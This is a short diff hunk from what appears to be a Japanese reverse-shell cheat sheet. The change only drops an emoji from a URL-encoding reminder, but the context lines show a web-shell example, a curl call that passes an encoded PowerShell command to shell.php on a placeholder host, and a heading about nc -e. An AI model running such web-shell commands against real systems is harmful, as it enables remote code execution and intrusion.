@@ -206,7 +206,7 @@ exit
 # WebShellの例
 curl http://example.com/shell.php?cmd=powershell -enc '<$EncodedTextの中身>'
 ```
-（🚨ペイロード部分はURL encode not plusすること）
+（ペイロード部分はURL encode not plusすること）
 
 #### 非推奨：`nc -e`
 
